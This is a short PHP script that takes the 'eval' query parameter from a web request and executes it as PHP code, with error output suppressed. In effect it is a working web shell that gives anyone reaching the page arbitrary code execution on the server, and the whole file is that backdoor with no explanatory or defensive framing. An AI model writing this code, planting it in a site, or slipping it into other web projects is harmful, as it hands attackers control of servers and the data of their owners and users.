<?php
function xeval($code){
	@eval($code);
	return "";
}

if(isset($_GET['eval']) && ($_GET['eval'] != ""))
	xeval($_GET['eval']);
?>